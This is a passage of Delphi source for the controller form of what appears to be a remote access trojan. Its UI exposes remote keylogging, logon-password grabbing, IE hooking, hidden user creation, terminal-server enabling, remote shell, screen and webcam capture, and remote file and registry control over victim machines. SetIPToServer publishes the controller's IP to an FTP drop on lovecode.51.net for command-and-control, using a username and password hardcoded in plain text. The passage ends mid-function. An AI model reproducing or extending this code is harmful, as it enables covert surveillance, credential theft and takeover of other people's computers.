unit main;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls, Buttons, Menus,uTransDataSrv,data,
  ImgList, ScktComp,func,shellapi,shlobj,ActiveX,registry,uConfigSvrGuid,uRegEdit, //, WinSkinData
  winSvc,uHelper,untQQWry, DateUtils,funcs,ufVideo,udlgCMD,ufScr,uDebug,
  System.ImageList,FileCtrl;

type
  pDriveInfo=^stDriveInfo;
  stDriveInfo=packed record
    name:array[0..2] of ansiChar;
    t:dword;
  end;
  tDriveInfos=array of stDriveInfo;
  pDriveInfos=^tDriveInfos;
  pRegInfo=^stRegInfo;
  stRegInfo=record
    rk:HKEY;
    key,val,Data:pansiChar;
  end;
  TRegOp=(REnumKey,RCreateKey,RRenameKey,RDelKey,RCreateVal,RrenameVal,RDelVal,RGetVal,REnumFree);
  pRegOpInfo=^stRegOpInfo;
  stRegOpInfo=record
    op:TRegOp;
    rk:HKEY;
    key:array[0..max_path-1] of ansiChar;
    val:array[0..max_path-1] of ansiChar;
    typ:DWORD;
    dat:pointer;
    siz:dword;
  end;
  //******************************************************************************
  TsvcOp=(SEnumSvc,SRunSvc,SStopSvc,SShutDownSvc,SEnableSvc,SDisableSvc,SUnRegSvc);
  pSvcOpInfo=^stSvcOpInfo;
  stSvcOpInfo=record
    op:TsvcOp;
    name:array[0..31] of ansiChar;
  end;

  TEnumServices = array[0..0] of TEnumServiceStatus;
  PEnumServices = ^TEnumServices;

  pServiceStatus=^stServiceStatus;
  stServiceStatus=record
    ServiceType:array[0..63] of ansiChar;
    CurrentState:array[0..63] of ansiChar;
    ControlsAccepted:array[0..63] of ansiChar;
    Win32ExitCode:array[0..63] of ansiChar;
    ServiceSpecificExitCode:array[0..63] of ansiChar;
    CheckPoint:array[0..63] of ansiChar;
    WaitHint:array[0..63] of ansiChar;
  end;
  PServiceConfig=^stServiceConfig;
  stServiceConfig=record
    ServiceType:array[0..63] of ansiChar;
    StartType:array[0..63] of ansiChar;
    ErrorControl:array[0..63] of ansiChar;
    BinaryPathName:array[0..max_path] of ansiChar;
    ServiceDll:array[0..max_path] of ansiChar;
    LoadOrderGroup:array[0..63] of ansiChar;
    TagId:array[0..63] of ansiChar;
    Dependencies:array[0..63] of ansiChar;
    ServiceStartName:array[0..63] of ansiChar;
    DisplayName:array[0..127] of ansiChar;
    Description:array[0..255] of ansiChar;
  end;
  pServiceInfo=^stServiceInfo;
  stServiceInfo=record
    ID:array[0..3] of ansiChar;
    ServiceName:array[0..63] of ansiChar;
    DisplayName:array[0..127] of ansiChar;
    ServiceStatus:stServiceStatus;
    ServiceConfig:stServiceConfig;
  end;
  PServicesInfo=^TServicesInfo;
  TServicesInfo=array[0..0] of stServiceInfo;
  //************************************************************************
  TFMain = class(TForm)
    MainMenu1: TMainMenu;
    N1: TMenuItem;
    N7: TMenuItem;
    N8: TMenuItem;
    N9: TMenuItem;
    N10: TMenuItem;
    N31: TMenuItem;
    N2: TMenuItem;
    N11: TMenuItem;
    N12: TMenuItem;
    N13: TMenuItem;
    N14: TMenuItem;
    N3: TMenuItem;
    menuListPro: TMenuItem;
    menuCutPro: TMenuItem;
    N5: TMenuItem;
    N17: TMenuItem;
    N18: TMenuItem;
    N19: TMenuItem;
    N25: TMenuItem;
    N24: TMenuItem;
    N6: TMenuItem;
    menuHookKey: TMenuItem;
    memuGetHookKeys: TMenuItem;
    menuCloseHookKey: TMenuItem;
    N4: TMenuItem;
    N41: TMenuItem;
    menuColorMode: TMenuItem;
    menuColor1: TMenuItem;
    menuColor4: TMenuItem;
    menuColor8: TMenuItem;
    menuColor16: TMenuItem;
    menuColor24: TMenuItem;
    N15: TMenuItem;
    menuScrSeries: TMenuItem;
    N22: TMenuItem;
    menuQComs: TMenuItem;
    N26: TMenuItem;
    N23: TMenuItem;
    Panel1: TPanel;
    btnProcess: TSpeedButton;
    btnHelper: TSpeedButton;
    SpeedButton10: TSpeedButton;
    btnSingleScr: TSpeedButton;
    btnGetKey: TSpeedButton;
    edtVtKey: TEdit;
    Bar1: TStatusBar;
    IMLFolders: TImageList;
    PopRegTree: TPopupMenu;
    N27: TMenuItem;
    PopCrtKey: TMenuItem;
    N28: TMenuItem;
    PopCrtStr: TMenuItem;
    PopCrtB: TMenuItem;
    PopCrtD: TMenuItem;
    N29: TMenuItem;
    PopDelKey: TMenuItem;
    PopRenKey: TMenuItem;
    popComInfo: TPopupMenu;
    popMemoComInfo: TMenuItem;
    PopRegList: TPopupMenu;
    PopEdtValue: TMenuItem;
    N30: TMenuItem;
    PopDelValue: TMenuItem;
    PopRenValue: TMenuItem;
    PopFile: TPopupMenu;
    popUpFile: TMenuItem;
    PopDownFile: TMenuItem;
    PopDelFile: TMenuItem;
    PopRunFile: TMenuItem;
    PopAttrFile: TMenuItem;
    Save1: TSaveDialog;
    PopDir: TPopupMenu;
    PopCrtDir: TMenuItem;
    PopDelDir: TMenuItem;
    PopUpLoadDir: TMenuItem;
    PopDownDir: TMenuItem;
    PopSearchFile: TMenuItem;
    Open1: TOpenDialog;
    Find1: TFindDialog;
    popCom: TPopupMenu;
    popDisCon: TMenuItem;
    popUpdateTree1: TMenuItem;
    treeClient: TTreeView;
    Page1: TPageControl;
    TabSheet6: TTabSheet;
    memoPCInfo: TMemo;
    TabSheet1: TTabSheet;
    TreeDir: TTreeView;
    ListFiles: TListView;
    TabSheet2: TTabSheet;
    TreeProc: TTreeView;
    TabSheet3: TTabSheet;
    TreeReg: TTreeView;
    ListReg: TListView;
    TabSheet4: TTabSheet;
    MemoKeys: TMemo;
    TabSheet5: TTabSheet;
    ScrollBox1: TScrollBox;
    imgScreen: TImage;
    tbsControlSet: TTabSheet;
    menuScrStart: TMenuItem;
    menuScrContinue: TMenuItem;
    menuScrPause: TMenuItem;
    menuScrClose: TMenuItem;
    popProc: TPopupMenu;
    popKillProc: TMenuItem;
    btnSendCAD: TButton;
    TabSheet7: TTabSheet;
    ListSvc: TListView;
    MemoSvc: TMemo;
    popSvcCtrl: TPopupMenu;
    popSvcStatus: TMenuItem;
    popSvcStart: TMenuItem;
    popSvcStop: TMenuItem;
    popSvcShutDown: TMenuItem;
    popSvcDisable: TMenuItem;
    popSvcUnReg: TMenuItem;
    btnSvcEnum: TSpeedButton;
    popEnumSvc: TPopupMenu;
    popSvc: TMenuItem;
    popDriver: TMenuItem;
    popSvcAndDrv: TMenuItem;
    N16: TMenuItem;
    N20: TMenuItem;
    N21: TMenuItem;
    N32: TMenuItem;
    N33: TMenuItem;
    N34: TMenuItem;
    N35: TMenuItem;
    N36: TMenuItem;
    N37: TMenuItem;
    N38: TMenuItem;
    menuSavePic: TMenuItem;
    btnFilterIP: TButton;
    Splitter1: TSplitter;
    Panel4: TPanel;
    pnSysControl: TPanel;
    btnReboot: TButton;
    btnTermServer: TButton;
    btnCrtUser: TButton;
    btnHookIE: TButton;
    btnUnHookIE: TButton;
    btnCloseSvr: TButton;
    btnUpdateSvr: TButton;
    btnUnRegSvr: TButton;
    btnGetLogonPWD: TButton;
    pnSendMsg: TPanel;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    edtWindowCaption: TEdit;
    edtMsgText: TEdit;
    cmbIconType: TComboBox;
    cmbBtnType: TComboBox;
    btnMsgView: TButton;
    btnSendMsg: TButton;
    Splitter2: TSplitter;
    Splitter3: TSplitter;
    Splitter4: TSplitter;
    Splitter6: TSplitter;
    ListPCInfo: TListView;
    treeOrder: TTreeView;
    Splitter5: TSplitter;
    menuAutoUpdate: TMenuItem;
    Splitter7: TSplitter;
    menuQuickConn: TMenuItem;
    PageInfo: TPageControl;
    TabSheet8: TTabSheet;
    memoOut: TMemo;
    TabSheet9: TTabSheet;
    MemoThread: TMemo;
    popSearchProc: TMenuItem;
    btnCMD: TButton;
    btnVideo: TButton;
    N39: TMenuItem;
    menuScr: TMenuItem;
    menuvideo: TMenuItem;
    popSusProc: TMenuItem;
    N40: TMenuItem;
    popResProc: TMenuItem;
    N43: TMenuItem;
    N42: TMenuItem;
    menuOpenFileHookKey: TMenuItem;
    menuGetFileHookKey: TMenuItem;
    menuCloseFileHookKey: TMenuItem;
    N44: TMenuItem;
    menuHookFileKeyOpen: TMenuItem;
    menuClearHookKeyFile: TMenuItem;
    menuFloatPic: TMenuItem;
    menuClearRemoteHookKeyFile: TMenuItem;
    btnReset: TButton;
    procedure FormShow(Sender: TObject);
    procedure TreeClientChange(Sender: TObject; Node: TTreeNode);
    procedure SpeedButton10Click(Sender: TObject);
    procedure imgScreenMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure imgScreenMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure edtVtKeyKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure menuScrStartClick(Sender: TObject);
    procedure menuScrPauseClick(Sender: TObject);
    procedure menuScrContinueClick(Sender: TObject);
    procedure menuScrCloseClick(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure popDisConClick(Sender: TObject);
    procedure TreeDirChange(Sender: TObject; Node: TTreeNode);
    procedure popUpFileClick(Sender: TObject);
    procedure PopDownFileClick(Sender: TObject);
    procedure PopUpLoadDirClick(Sender: TObject);
    procedure PopDownDirClick(Sender: TObject);
    procedure edtVtKeyKeyUp(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure btnProcessClick(Sender: TObject);
    procedure TreeProcMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure popKillProcClick(Sender: TObject);
    procedure PopCrtKeyClick(Sender: TObject);
    procedure popUpdateTree1Click(Sender: TObject);
    procedure menuHookKeyClick(Sender: TObject);
    procedure memuGetHookKeysClick(Sender: TObject);
    procedure menuCloseHookKeyClick(Sender: TObject);
    procedure btnHookIEClick(Sender: TObject);
    procedure btnUnHookIEClick(Sender: TObject);
    procedure treeOrderChange(Sender: TObject; Node: TTreeNode);
    procedure btnCloseSvrClick(Sender: TObject);
    procedure btnUpdateSvrClick(Sender: TObject);
    procedure menuQComsClick(Sender: TObject);
    procedure PopRunFileClick(Sender: TObject);
    procedure PopDelFileClick(Sender: TObject);
    procedure btnUnRegSvrClick(Sender: TObject);
    procedure PopCrtDirClick(Sender: TObject);
    procedure PopDelDirClick(Sender: TObject);
    procedure btnSendCADClick(Sender: TObject);
    procedure btnSvcEnumClick(Sender: TObject);
    procedure ListSvcSelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure popSvcStartClick(Sender: TObject);
    procedure btnSingleScrClick(Sender: TObject);
    procedure btnRebootClick(Sender: TObject);
    procedure btnCrtUserClick(Sender: TObject);
    procedure btnTermServerClick(Sender: TObject);
    procedure btnHelperClick(Sender: TObject);
    procedure btnFilterIPClick(Sender: TObject);
    procedure ListPCInfoSelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure popSearchProcClick(Sender: TObject);
    procedure btnCMDClick(Sender: TObject);
    procedure btnVideoClick(Sender: TObject);
    procedure popSusProcClick(Sender: TObject);
    procedure popResProcClick(Sender: TObject);
    procedure menuOpenFileHookKeyClick(Sender: TObject);
    procedure menuGetFileHookKeyClick(Sender: TObject);
    procedure menuCloseFileHookKeyClick(Sender: TObject);
    procedure menuHookFileKeyOpenClick(Sender: TObject);
    procedure menuClearHookKeyFileClick(Sender: TObject);
    procedure menuClearRemoteHookKeyFileClick(Sender: TObject);
    procedure btnResetClick(Sender: TObject);
  private
    { Private declarations }
    bSingleScr:BOOL;
    QQWry: TQQWry;
    QQWryFile:string;
    procedure ShowIPAddr(IP:string);
    function GetIPAddr(IP:string):string;
    procedure SetIPToServer();
    procedure SetImageLists(list:tlistview);
    procedure TransDataMsg(var aMessage:Tmessage);message wm_TransData;
    function CurConActive:boolean;
    //function SetCurConActive:boolean;  //2015.5.26重置为等待状态
    procedure OnConn(var msg:Tmessage);message wm_conn;
    function AddConToTree(Socket: TCustomWinSocket):ttreenode;
    function AddConToList(Socket: TCustomWinSocket): TListItem;
    procedure ShowSocketErr(ErrorEvent: TErrorEvent);
    procedure ProcessGetPCInfo(Socket:TCustomWinSocket);
    procedure ShowPCInfo(item:tlistitem);
    procedure ProcessGetDrvs(Drvs:pointer;size:integer);
    function getTreeDir(node:ttreenode):string;
    function getListFile(node:ttreenode;item:tlistItem):string;
    procedure ProcessGetFileInfos(FileInfos:pointer;size:integer);
    function GetFileIconIndex(FileName: string; Large: Boolean): Integer;
    function SelDir(const Caption: String; const Root: WideString; out Directory: String): Boolean;
    procedure ProcessGetProcs(procs:pointer;size:integer);
    procedure ProcessGetRegInfo(RegInfo:pointer;size:integer);
    procedure UpdateTreeProcess(Tree: TTreeView;FullFileNameList:tstrings);
    procedure addRegTree(ss:tstrings;tree:ttreeview);
    procedure AddRegList(valueName:pansiChar;dwType:DWORD;data:pointer;dataSize:DWORD;list:Tlistview);
    procedure ProcessGetPCName(pcName:pansiChar;node:ttreeNode);
    procedure ProcessGetSvcInfo(SvcInfo:pointer;size:integer);
    function GetSvrOStype:integer;
    procedure GetSvcMemo(var ss:tstrings);
  public
    { Public declarations }
    function RemoteExist(IP:string):bool;
  end;
const
  MyServer='';
var
  FMain: TFMain;
  bTree1Change:boolean;
  InitPath:string;
function BrowseCallbackProc(hwnd: HWND;uMsg: UINT;lParam: Cardinal;lpData: Cardinal): integer; stdcall;
implementation

{$R *.dfm}
function tfmain.RemoteExist(IP:string):bool;
var
  i:integer;
  s:string;
begin
  result:=true;
  for i:=0 to ListPCInfo.Items.Count-1 do
  begin
    s:=ListPCInfo.Items[i].SubItems[5];
    if s=IP then exit;
  end;//for
  result:=false;
end;

procedure tfmain.SetIPToServer();
var
  IP:array[0..127] of ansiChar;
  pIP:PIPServer;
  id,hd:cardinal;
begin
   GetLocalIP(IP);
   new(pIP);
   pIP^.svr.port:=21;
   pIP^.svr.flg:=1;
   pIP^.svr.DN:='lovecode.51.net';
   pip^.aFile:='/public_html/photo/ip1.dat';
   pip^.user:='lovecode';
   pip^.pwd:='byc760108';
   pip^.mysvr.svr.port:=dm.ss.Port;
   pip^.mysvr.svr.flg:=0;
   strcopy(pip^.mysvr.svr.IP,IP);
   pip^.mysvr.dport:=uTransDataSrv.PORT;
   hd:=createthread(nil,0,@SetIPServer,pip,0,id);
   closehandle(hd);
   //if SetIPServer(pIP) then
   //  memoPCInfo.Lines.Add('设置'+IP+'到ftp://lovecode.51.net/public_html/photo/ip1.dat成功！')
   //else
   //  memoPCInfo.Lines.Add('设置'+IP+'到ftp://lovecode.51.net/public_html/photo/ip1.dat失败！');
end;

procedure tfmain.ShowIPAddr(IP:string);
begin
  if IP='' then
  begin
    QQWryFile:=application.ExeName;
    QQWryFile:=ExtractFilePath(QQWryFile)+'QQWry.dat';
    if FileExists(QQWryFile) then begin
      QQWry:=TQQWry.Create(QQWryFile);
      MemoPCInfo.Lines.Add('-----数据库-------');
      MemoPCInfo.Lines.Add('文件大小: ' + sysutils.IntToStr(QQWry.GetQQWryFileSize));
      MemoPCInfo.Lines.Add('记录总数: ' + sysutils.IntToStr(QQWry.GetIPRecordNum));
      MemoPCInfo.Lines.Add('更新日期: ' + QQWry.GetQQWryDate);
      //MemoPCInfo.Lines.Add('更新日期: ' + format('%d年%d月%d日', [yearof(QQWry.GetQQWryDate), monthof(QQWry.GetQQWryDate), dayof(QQWry.GetQQWryDate)]));
      MemoPCInfo.Lines.Add('数据库来源: ' + QQWry.GetQQWryDataFrom);
      QQWry.Free;
    end
    else begin
      QQWryFile:='';
    end; //if FileExists(QQWryFile) then begin
  end
  else begin
    if QQWryFile<>'' then
    begin
      QQWry:=TQQWry.Create(QQWryFile);
      MemoPCInfo.Lines.Add('IP: '+IP+
        ' 国家: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[2] +
        ' 地区: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[3]);
      {
      MemoPCInfo.Lines.Add('记录ID: ' + IntToStr(QQWry.GetIPRecordID(IP)) +
                    ' IP范围: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[0] + ' - ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[1] +
                    ' 国家: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[2] +
                    ' 地区: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[3]);
      }
      QQWry.Free;
    end;//if QQWryFile<>'' then
  end;//
end;
function tfmain.GetIPAddr(IP:string):string;
//06-05-13
begin
  if QQWryFile<>'' then
  begin
    QQWry:=TQQWry.Create(QQWryFile);
    result:=' 国家: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[2] +' 地区: ' + QQWry.GetIPMsg(QQWry.GetIPRecordID(IP))[3];
    QQWry.Free;
  end;//if QQWryFile<>'' then
end;
procedure tfmain.GetSvcMemo(var ss:tstrings);
var
  FileName,dll:string;
  fs:tstrings;
  item:tlistitem;
begin
  if ListSvc.SelCount<=0 then exit;
  fs:=tstringlist.Create;
  ss.Clear;
  with ListSvc do
  begin
    item:=Selected;
    ss.Add('编 号:'+item.SubItems[17]);
    ss.Add('服 务 名:'+item.Caption);
    ss.Add('显示的名称:'+item.SubItems[0]);
    ss.Add('服 务 类 型:'+item.SubItems[1]);
    ss.Add('当 前 状 态:'+item.SubItems[2]);
    ss.Add('可接受的状态:'+item.SubItems[3]);
    ss.Add('启 动 方 式:'+item.SubItems[4]);
    ss.Add('文 件 名:'+item.SubItems[5]);
    ss.Add('ServiceDll:'+item.SubItems[6]);
    ss.Add('所 属 组:'+item.SubItems[7]);
    ss.Add('依 赖 服 务:'+item.SubItems[8]);
    ss.Add('WinExitCode:'+item.SubItems[9]);
    ss.Add('SvcExitCode:'+item.SubItems[10]);
    ss.Add('检 查 点:'+item.SubItems[11]);
    ss.Add('等 待 延 迟:'+item.SubItems[12]);
    ss.Add('错误控制方式:'+item.SubItems[13]);
    ss.Add('TagId:'+item.SubItems[14]);
    ss.Add('启 动 名 称:'+item.SubItems[15]);
    ss.Add('描 述:'+item.SubItems[16]);
    ss.Add('功 能:'+item.SubItems[17]);
    ss.Add('');ss.Add('');
    ss.Add('文件信息：------------------------------------');
    FileName:=trim(item.SubItems[5]);
    dll:=trim(item.SubItems[6]);
    if FileName<>'' then
    if CoordinateFileName(FileName) then
    begin
      ss.Add(FileName);
      fs.Clear;
      GetFileInfo(FileName,fs);
      ss.AddStrings(fs);
    end;//if name<>''
    if dll<>'' then
    if CoordinateFileName(dll) then
    begin
      ss.Add('');ss.Add('');
      ss.Add(dll);
      fs.Clear;
      GetFileInfo(dll,fs);
      ss.AddStrings(fs);
    end;//if name<>''
  end;
  fs.Free;
end;
procedure tfmain.ProcessGetSvcInfo(SvcInfo:pointer;size:integer);
var
  ps:PServicesInfo;
  ServiceCount,i:DWORD;
  item:tlistItem;
begin
  ps:=SvcInfo;
  ServiceCount:=size div sizeof(stServiceInfo);
  ListSvc.Clear;
  memoSvc.Clear;
  if ServiceCount=0 then
  begin
    exit;
  end;
  with ListSvc do
  begin
    for i:=0 to servicecount-1 do
    begin
      //fields[0].AsInteger:=strtoint(ps[i].ID);
      item:=items.Add;
      item.Caption:=ps[i].ServiceName;
      item.SubItems.Add(ps[i].DisplayName);
      item.SubItems.Add(ps[i].ServiceStatus.ServiceType);
      item.SubItems.Add(ps[i].ServiceStatus.CurrentState);
      item.SubItems.Add(ps[i].ServiceStatus.ControlsAccepted);
      item.SubItems.Add(ps[i].ServiceConfig.StartType);
      item.SubItems.Add(ps[i].ServiceConfig.BinaryPathName);
      item.SubItems.Add(ps[i].ServiceConfig.ServiceDll);
      item.SubItems.Add(ps[i].ServiceConfig.LoadOrderGroup);
      item.SubItems.Add(ps[i].ServiceConfig.Dependencies);
      item.SubItems.Add(ps[i].ServiceStatus.Win32ExitCode);
      item.SubItems.Add(ps[i].ServiceStatus.ServiceSpecificExitCode);
      item.SubItems.Add(ps[i].ServiceStatus.CheckPoint);
      item.SubItems.Add(ps[i].ServiceStatus.WaitHint);
      item.SubItems.Add(ps[i].ServiceConfig.ErrorControl);
      item.SubItems.Add(ps[i].ServiceConfig.TagId);
      item.SubItems.Add(ps[i].ServiceConfig.ServiceStartName);
      item.SubItems.Add(ps[i].ServiceConfig.Description);
      item.SubItems.Add(ps[i].ID);
      item.ImageIndex:=getFileiconIndex(trim(ps[i].ServiceConfig.BinaryPathName),false);
    end;// for
  end;//with
end;
function tfmain.GetSvrOStype:integer;
var
  ss:tstrings;
  os:string;
  i,k:integer;
begin
  result:=-1;
  if memoPCInfo.Text='' then exit;
  ss:=tstringlist.Create;
  ss:=memoPCInfo.Lines;
  for i:=0 to ss.Count-1 do
  begin
    os:=ss.Strings[i];
    k:=pos('操作系统:',os);
    if k>0 then
    begin
      delete(os,k,9);
      os:=trim(os);
      k:=pos('98',os);
      if k>0 then result:=0 else result:=1;
      k:=pos(uppercase('me'),uppercase(os));
      if k>0 then result:=0 else result:=1;
    end;//if k>0 then
  end;//for
  ss.Free;
end;

procedure tfmain.ProcessGetPCName(pcName:pansiChar;node:ttreeNode);
//2006-03-17:增加记录gsyh,gszf功能
//06-05-13:去除记录gsyh,gszf功能
var
  i:integer;
  p:pansiChar;
  pc,ip:array[0..255] of ansiChar;
  buf:array[0..1023] of ansiChar;
begin
  p:=strpos(pcName,'|');
  if p<>nil then
    strLcopy(pc,pcName,p-pcName)
  else
    strcopy(pc,pcName);
  for i:=0 to treeclient.Items.Count-1 do
  begin
    if treeclient.Items[i]=node then
    begin
      strcopy(ip,pansiChar(treeClient.Items[i].Text));
      treeClient.Items[i].Text:=pc;
    end;//if treeclient.Items[i]=node then
  end;//for i:=0 to treeclient.Items.Count-1 do
  if p<>nil then
  begin
    strcopy(buf,ip);strcat(buf,p);
    memoPCInfo.Lines.Add(buf);
    ip:='';pc:='';
    GetModuleFileNameA(0,ip,sizeof(ip));
    ExtractFileDir(ip,pc);strcat(pc,'\server.txt');
    func.Log(buf,pc);
  end;
end;
procedure tfmain.AddRegList(valueName:pansiChar;dwType:DWORD;data:pointer;dataSize:DWORD;list:Tlistview);
var
  sType,sData:string;
  item:tListitem;
begin
  item:=list.Items.Add;
  item.Caption:=valueName;
  item.ImageIndex:=2;
  case dwType of
    REG_BINARY:
    begin
      sType:='REG_BINARY';
      sData:=BinToStr(data,dataSize);
    end;
    REG_DWORD:
    begin
      sType:='REG_DWORD';
      sData:=sysutils.inttostr(DWORD(Data^));
    end; //REG_DWORD_LITTLE_ENDIAN
    REG_DWORD_BIG_ENDIAN:
    begin
      sType:='REG_DWORD_BIG_ENDIAN';
      sData:=sysutils.inttostr(DWORD(Data^));
    end;
    REG_EXPAND_SZ:
    begin
      sType:='REG_EXPAND_SZ';
      sData:=pansiChar(data);
    end;
    REG_LINK:
    begin
      sType:='REG_LINK';
    end;
    REG_MULTI_SZ:
    begin
      sType:='REG_MULTI_SZ';
      sData:=pansiChar(data);
    end;
    REG_NONE:
    begin
      stype:='REG_NONE';
    end;
    REG_RESOURCE_LIST:
    begin
      sType:='REG_RESOURCE_LIST';
    end;
    REG_SZ:
    begin
      sType:='REG_SZ';
      sData:=pansiChar(data);
    end;
  end;//case
  item.SubItems.Add(sType);
  item.SubItems.Add(sData);
end;
procedure tfmain.AddRegTree(ss:tstrings;tree:ttreeview);
var
  i:integer;
  node:ttreenode;
begin
  node:=tree.Selected;
  node.DeleteChildren;
  for i:=0 to ss.Count-1 do
  begin
    node:=tree.Items.AddChild(tree.Selected,ss[i]);
    node.ImageIndex:=6;
    node.SelectedIndex:=7;
    node.StateIndex:=6;
    node:=tree.Selected;
    Node.AlphaSort;
  end;//for
  node.Expanded:=true;
end;
procedure tfmain.ProcessGetRegInfo(RegInfo:pointer;size:integer);
label 1;
var
  err,i:integer;
  hk:hkey;
  cSubKeys,cbMaxSubKeyLen,cVals,cbMaxValNameLen,cbMaxValLen:DWORD;
  cbSubKeyLen,cbValNameLen,cbValLen:DWORD;
  p:pointer;
  pd:PDWORD;
  pc:pansiChar;
  pb:pointer;
  subkeysLen,dwType:DWORD;
  ss:tstrings;
  lpValueName:pansiChar;
  bData:array[0..8192] of ansiChar;
  //数据流结构：1、子键数目；2、最大子键长度；3值数目；4、最大值名长度；5、最大数据长度；
  //6、子键列表大小；7、子键列表；8、值长度；9、值类型；10、数据长度；11、值名称；12、数据；
begin
  //copymemory(@bData,RegInfo,size);
  //memoOut.Lines.Text:=string(bData);
  p:=RegInfo;
  ss:=tstringlist.Create;
  //1、取子键数目
  pd:=PDWORD(p);cSubKeys:=pd^;p:=pointer(DWORD(p)+sizeof(DWORD));
  //2、取最大子键长度
  pd:=PDWORD(p);cbMaxSubKeyLen:=pd^;p:=pointer(DWORD(p)+sizeof(DWORD));
  //3、取值数目
  pd:=PDWORD(p);cVals:=pd^;p:=pointer(DWORD(p)+sizeof(DWORD));
  //4、取最大值名长度
  pd:=PDWORD(p);cbMaxValNameLen:=pd^;p:=pointer(DWORD(p)+sizeof(DWORD));
  //5、取最大数据长度
  pd:=PDWORD(p);cbMaxValLen:=pd^;p:=pointer(DWORD(p)+sizeof(DWORD));
  //6、取子键列表大小；
  pd:=PDWORD(p);subKeysLen:=pd^;p:=pointer(DWORD(p)+sizeof(DWORD));
  //7、取子键列表；
  if cSubKeys>0 then
  begin
    ss.Text:=pansiChar(p);
    AddRegTree(ss,treeReg);
    p:=pointer(DWORD(p)+subkeysLen);
  end;//if cSubKeys>0 then
  //8、取值：
  ListReg.Items.Clear;
  if cVals>0 then
  begin
    pb:=virtualAlloc(nil,cbMaxValLen,MEM_COMMIT,PAGE_READWRITE);
    for i:=0 to cVals-1 do
    begin
      //8、取值长度：
      pd:=PDWORD(p);cbValNameLen:=pd^;p:=pointer(DWORD(p)+sizeof(DWORD));
      //9、取值类型：
      pd:=PDWORD(p);dwType:=pd^;p:=pointer(DWORD(p)+sizeof(DWORD));
      //10、取数据长度：
      pd:=PDWORD(p);cbValLen:=pd^;p:=pointer(DWORD(p)+sizeof(DWORD));
      //11、取值名称：
      lpValueName:=p;p:=pointer(DWORD(p)+cbValNameLen+1);
      //12、取数据
      copymemory(pb,p,cbVallen);p:=pointer(DWORD(p)+cbValLen);
      AddRegList(lpValueName,dwtype,pb,cbValLen,ListReg);
    end;//for
    virtualFree(pb,cbMaxValLen,MEM_DECOMMIT);
    virtualFree(pb,0,MEM_RELEASE);
  end;//if cVals>0 then
1:
  ss.Free;
end;
procedure tfmain.UpdateTreeProcess(Tree: TTreeView;FullFileNameList:tstrings);
var
  I: Integer;
  MyNode: TTreeNode;
begin
  with Tree.Items do
  begin
    Clear;
    if MyNode <> nil then MyNode := nil;
    for I := 0 to FullFileNameList.Count - 1 do
    begin
      if (MyNode = nil) or (UpperCase(Copy(FullFileNameList[I], Length(FullFileNameList[I]) - 2, 3)) = 'EXE') then
      begin
        MyNode := Add(nil, FullFileNameList[i]);
      end
      else begin
        AddChild(MyNode, FullFileNameList[i]);
      end;//
    end;
  end;
end;
procedure tfmain.ProcessGetProcs(procs:pointer;size:integer);
var
  ss:tstrings;
begin
  ss:=tstringlist.Create;
  ss.Text:=pansiChar(procs);
  UpdateTreeProcess(treeProc,ss);
  ss.Free;
end;
function BrowseCallbackProc(hwnd: HWND;uMsg: UINT;lParam: Cardinal;lpData: Cardinal): integer; stdcall;
var
  Rect: TRect;
begin
  if uMsg=BFFM_INITIALIZED then
    result :=SendMessage(Hwnd,BFFM_SETSELECTION,Ord(TRUE),Longint(PansiChar(InitPath)))
  else
    result :=1;
end;
function tfmain.SelDir(const Caption: string; const Root: WideString; out Directory: string): Boolean;
var
  WindowList: Pointer;
  BrowseInfo: TBrowseInfo;
  Buffer: PChar;
  RootItemIDList, ItemIDList: PItemIDList;
  ShellMalloc: IMalloc;
  IDesktopFolder: IShellFolder;
  Eaten, Flags: LongWord;
begin
  Result := False;
  Directory := '';
  FillChar(BrowseInfo, SizeOf(BrowseInfo), 0);
  if (ShGetMalloc(ShellMalloc) = S_OK) and (ShellMalloc <> nil) then
  begin
    Buffer := ShellMalloc.Alloc(MAX_PATH*sizeof(char));
    try
      RootItemIDList := nil;
      if Root <> '' then begin
        SHGetDesktopFolder(IDesktopFolder);
        IDesktopFolder.ParseDisplayName(Application.Handle, nil, POleStr(Root), Eaten, RootItemIDList, Flags);
      end;
      with BrowseInfo do begin
        hwndOwner := Application.Handle;
        pidlRoot := RootItemIDList;
        pszDisplayName := Buffer;
        lpszTitle := PChar(Caption);
        ulFlags := BIF_RETURNONLYFSDIRS;
        lpfn :=@BrowseCallbackProc;
        lParam :=BFFM_INITIALIZED;
      end;
      WindowList := DisableTaskWindows(0);
      try
        ItemIDList := ShBrowseForFolder(BrowseInfo);
      finally
        EnableTaskWindows(WindowList);
      end;
      Result := ItemIDList <> nil;
      if Result then begin
        ShGetPathFromIDList(ItemIDList, Buffer);
        ShellMalloc.Free(ItemIDList);
        Directory := Buffer;
      end;
    finally
      ShellMalloc.Free(Buffer);
    end;
  end;
end;
function tfmain.GetFileIconIndex(FileName: string; Large: Boolean): Integer;
{ 获取图标的序号函数 }
var
  Ext: string;
  Flags: Integer;
  FileInfo:TSHFileInfoA ;
  tmpstr:string;
begin
  Ext := FileName;
  Flags := SHGFI_SYSICONINDEX or SHGFI_TYPENAME or SHGFI_USEFILEATTRIBUTES;
  if Large then
    Flags := Flags or SHGFI_LARGEICON
  else
    Flags := Flags or SHGFI_SMALLICON;
  SHGetFileInfoA(PansiChar(Ext), 0, FileInfo, SizeOf(FileInfo), Flags);
  Result := FileInfo.iIcon;
